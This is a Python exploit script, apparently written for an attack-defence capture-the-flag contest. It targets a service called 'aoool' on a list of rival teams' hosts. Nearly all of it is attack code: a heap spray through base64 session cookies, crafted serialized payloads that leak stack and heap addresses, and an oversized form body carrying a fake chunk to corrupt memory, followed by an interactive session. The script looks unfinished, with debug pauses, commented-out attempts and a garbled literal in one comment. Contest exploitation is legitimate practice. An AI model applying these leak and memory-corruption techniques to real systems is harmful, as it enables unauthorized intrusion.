#!/usr/bin/env python

from pwn import *

import random
import socket
import ssl
import string
import telnetlib
from struct import pack, unpack
from base64 import b64decode, b64encode
import random
import time
import sys


# do whatever import you would like to do here..

# Don't touch this function
def run_exploit(host, port, pipe):
    flag = None
    try:
        flag = exploit(host, port)
        pipe.send(flag)
    except Exception, e:
        pipe.send(e)


# list of teams to shoot exploits (all listed except for our team)
team_list = [1,2,3,4,5,6,7,9,10,11,12,13,14,15,16]
service = 'aoool'  # target service (required)
timeout = 5  # define timeout here
author = 'setuid0'  # author

r = None


def my_repr(s):
    o = ""
    for c in s:
        if c not in string.printable:
            o += "\\x%02x" % ord(c)
        else:
            o += c
    return o


class MySocket:
    def __init__(self, socketObject, verbose=True, isSSL=False, timeout=None, fast=False, keyfile=None, certfile=None):
        # noinspection PyProtectedMember
        if not isinstance(socketObject, socket._socketobject):
            raise NotImplementedError

        self._sock = socketObject
        if timeout:
            self._sock.settimeout(timeout)
        if isSSL:
            self._sock = ssl.wrap_socket(self._sock, keyfile=keyfile, certfile=certfile)
        self._telnet = telnetlib.Telnet()
        self._telnet.sock = self._sock
        self.verbose = verbose
        self._fast = fast
        self._buffer = ''

    def timeout(self, timeout):
        self._sock.settimeout(timeout)

    def recv(self, length=0x1000):
        if self._fast:
            self._buffer += self._sock.recv(0x10000000)
            r = self._buffer[:length]
            self._buffer = self._buffer[length:]
            return r
        else:
            return self._sock.recv(length)

    def send(self, data):
        return self._sock.send(data)

    def sendall(self, data):
        return self._sock.sendall(data)

    def shutdown(self, mode):
        self._sock.shutdown(mode)

    def close(self):
        self._sock.close()

    def interact(self):
        self._telnet.interact()

    def until(self, term, verbose=True):
        if self._fast:
            while True:
                if term in self._buffer:
                    idx = self._buffer.index(term)
                    o = self._buffer[:idx + len(term)]
                    self._buffer = self._buffer[idx + len(term):]
                    if self.verbose and verbose:
                        print my_repr(o)
                    return o

                t = self._sock.recv(0x10000000)
                self._buffer += t
                if len(t) == 0:
                    o = self._buffer
                    self._buffer = ''
                    return o

        else:
            o = ''
            while True:
                t = self._sock.recv(1)
                o += t
                if term in o or len(t) == 0:
                    if self.verbose and verbose:
                        print my_repr(o)
                    return o

    def recvuntil(self, term):
        return self.until(term, verbose=False)

    def sendline(self, line):
        return self.send(line + '\n')

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()


# noinspection PyShadowingNames
def tcp(ip, port, verbose=True, ssl=False, timeout=None, fast=False, keyfile=None, certfile=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    return MySocket(sock, verbose, ssl, timeout=timeout, fast=fast, keyfile=keyfile, certfile=certfile)


def xor_value(value):
    a = 0
    while a == 0 or a == value:
        a = random.randint(1, 255)
    return a

charset1 = filter(lambda x: x not in '\x00\x0a', [chr(x) for x in range(256)])
charset2 = [chr(x) for x in range(33, 128)]


def dummy(length, charset=(string.ascii_letters + string.digits), exclude=''):
    _data = ''
    for _ in xrange(length):
        rnd = exclude
        while rnd in exclude:
            rnd = random.choice(charset)
        _data += rnd
    return _data


"""
    exploit(host, port)
    Launch exploit to host:port.
    You must close the connection (r.close())
"""

spray_sess = ''
spray_sess += 'a:%d:{' % 0x100
for i in xrange(0x100):
    spray_sess += 's:4:"%04d";' % i
    spray_sess += 's:16:"%s";' % ('A'*16)
spray_sess += '}'


def leak_addresses_1(host, port):
    global r

    r = tcp(host, port)

    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(spray_sess)
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    array_size = 3
    payload = ''
    payload += 'a:%d:{' % array_size
    payload += 'i:%d;' % 0x41414141
    payload += 'r:%d;' % (array_size + 1)
    payload += 'i:%d;' % 0x42424242
    payload += 'r:2;'
    payload += 's:%d:"%s";' % (1, "C")
    payload += 'i:1128481603;'
    payload += '}'
    http_payload = "GET /list HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    array_size = 3

    payload = ''
    payload += 'a:%d:{' % array_size
    payload += 's:%d:"%s";' % (0x38, "1" * 0x38)
    payload += 's:%d:"%s";' % (0x38, "\x20" * 4)
    payload += 's:%d:"%s";' % (0x38, "3" * 0x38)
    payload += 's:%d:"%s";' % (0x38, "4" * 0x38)
    payload += '}'
    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    # raw_input('debug')

    time.sleep(0.5)

    array_size = 1

    payload = ''
    payload += 'a:%d:{' % array_size

    payload += 's:%d:"%s";' % (0x38, "3" * 0x38)
    payload += 's:%d:"%s";' % (0x38, "3" * 0x38)

    payload += '}'
    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')
    r.recvuntil('\r\n\r\n')

    r.recvuntil('=>string(56) "')
    leak = r.recvuntil('"\n}</p>').split('"\n}</p>')[0].decode('utf8')
    print leak
    leak2 = ''
    for c in leak:
        leak2 += chr(ord(c) & 0xff)

    stack_addr = u64(leak2[0:8])
    heap_addr = u64(leak2[32:40])

    r.close()

    return stack_addr, heap_addr


def test_heap_base(host, port, guessed_heap_base):
    global r

    r = tcp(host, port)

    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    array_size = 3
    payload = ''
    payload += 'a:%d:{' % array_size
    payload += 'i:%d;' % 0x41414141
    payload += 'r:%d;' % (array_size + 1)
    payload += 'i:%d;' % 0x42424242
    payload += 'r:2;'
    payload += 's:%d:"%s";' % (1, "C")
    payload += 'i:1128481603;'
    payload += '}'
    http_payload = "GET /list HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    payload = ''
    payload += 'a1=' + '1' * 0x38
    payload += '&'
    payload += 'a2=' + '2' * 0x38
    payload += '&'
    payload += 'a3=' + '3' * 0x38
    payload += '&'
    payload += 'a3=' + '3' * 0x38
    payload += '&'
    payload += 'a4=' + p64(guessed_heap_base + 0x10) + '4' * 0x30
    payload += '&'
    payload += 'a5=' + '5' * 0x38
    payload += '&'
    payload += 'a6=' + '6' * 0x38
    payload += '&'
    payload = payload.ljust(0x1000, 'P')
    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += 'Content-Type: application/x-www-form-urlencoded\r\n'
    http_payload += "Content-Length: %d\r\n" % len(payload)
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "\r\n"
    http_payload += payload
    r.send(http_payload)

    return 'HttpRequest' in r.recvuntil('HttpRequest')


def exploit(host, port):
    global r

    stack_addr, heap_addr = leak_addresses_1(host, port)
    print 'stack_addr', hex(stack_addr)
    print 'heap_addr', hex(heap_addr)

    # heap_base = heap_addr - 0x30390
    # if test_heap_base(host, port, heap_base) and not test_heap_base(host, port, heap_base - 0x1000):
    #     pass
    # else:
    #     heap_base = (heap_addr & 0xfffffffffffff000) - 0x17000
    #     for _ in xrange(10):
    #         print 'trying heap base', hex(heap_base)
    #         if test_heap_base(host, port, heap_base) and not test_heap_base(host, port, heap_base - 0x1000):
    #             break
    #         heap_base += 0x1000
    #     else:
    #         print 'failed'
    #         return
    # print 'found heap base', hex(heap_base)
    #
    r = tcp(host, port)

    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(spray_sess)
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    array_size = 3
    payload = ''
    payload += 'a:%d:{' % array_size
    payload += 'i:%d;' % 0x41414141
    payload += 'r:%d;' % (array_size + 1)
    payload += 'i:%d;' % 0x42424242
    payload += 'r:2;'
    payload += 's:%d:"%s";' % (1, "C")
    payload += 'i:1128481603;'
    payload += '}'
    http_payload = "GET /list HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    http_payload += "\r\n"
    r.send(http_payload)
    r.recvuntil('HTTP/1.1 200 OK')

    raw_input('debug')

    # - 5 + 0xb30

    # 0x443e
    # fc = heap_addr - 0x443e + 14
    # print 'fc', hex(fc)

    # 0x555555bac490
    # leak_target = 0x555555554000 + 0x730B4
    leak_target = stack_addr - 5

    payload = ''
    payload += 'a1=' + '1' * 0x38
    payload += '&'
    payload += 'a2=' + '2' * 0x38
    payload += '&'
    payload += 'a3=' + '3' * 0x38
    payload += '&'
    payload += 'a3=' + '3' * 0x38
    payload += '&'
    payload += 'a4=' + p64(0x41414141) + '4' * 0x30
    payload += '&'
    payload += 'a5=' + '5' * 0x38
    payload += '&'
    payload += 'a6=' + (
        p64(0x41) + p64(0x42424242) + p64(0x41) + p64(0x41)
    ).ljust(0x38, 'X')[:0x38]
    payload += '&'
    payload = payload.ljust(0x1000, 'P')
    payload += '&'

    http_payload = "GET /info HTTP/1.1\r\n"
    http_payload += "Host: z\r\n"
    http_payload += 'Content-Type: application/x-www-form-urlencoded\r\n'
    http_payload += "Content-Length: %d\r\n" % len(payload)
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(spray_sess)
    http_payload += "\r\n"
    http_payload += payload
    r.send(http_payload)

    # r.recvuntil('(bytes 2..5) of `')

    r.interact()
    # 0x5555555ea1d1  (binary)
    # 0x1f
    # 0x7fffffffcf80
    # 0x7fffffffcd60
    # 0x555555878eed
    # 0x0
    # 0x5555555d84ab
    # 0x0
    # 0x5555558805db
    # 0x7fffffffce40
    # 0x555555b58be0
    # 0x7fffffffcff0
    # 0x7fffffffd000
    # 0x7fffffffcff0
    leak = r.recv(0x400)
    print repr(leak)
    for i in xrange(0, len(leak) // 8 * 8, 8):
        print i, hex(u64(leak[i:i+8]))

    # bin_addr = u64(leak[8:16]) - 0x7588c
    # print 'bin_addr', hex(bin_addr)

    # raw_input('debug')

    # array_size = 1
    #
    # payload = ''
    # payload += 'a:%d:{' % array_size
    #
    # payload += 's:%d:"%s";' % (0vmx38, "3" * 0x38)
    # payload += 's:%d:"%s";' % (0x38, "3" * 0x38)
    #
    # payload += '}'
    # http_payload = "GET /info HTTP/1.1\r\n"
    # http_payload += "Host: z\r\n"
    # http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    # http_payload += "\r\n"
    # r.send(http_payload)
    # r.recvuntil('HTTP/1.1 200 OK')
    # r.recvuntil('\r\n\r\n')

    # payload = 'B' * 0x38
    # http_payload = "GET /list HTTP/1.1\r\n"
    # http_payload += "Host: z\r\n"
    # http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    # http_payload += "Connection: keep-alive\r\n"
    # http_payload += "\r\n"
    # r.send(http_payload)
    # r.recvuntil('HTTP/1.1 200 OK')

    r.interact()


if __name__ == '__main__':
    # Please change host,port from args
    exploit('localhost', 47793)
    # exploit('10.13.37.8', 47793)
    # exploit('10.13.37.8', 8080)
    # you can debug here
    # r.interactive()
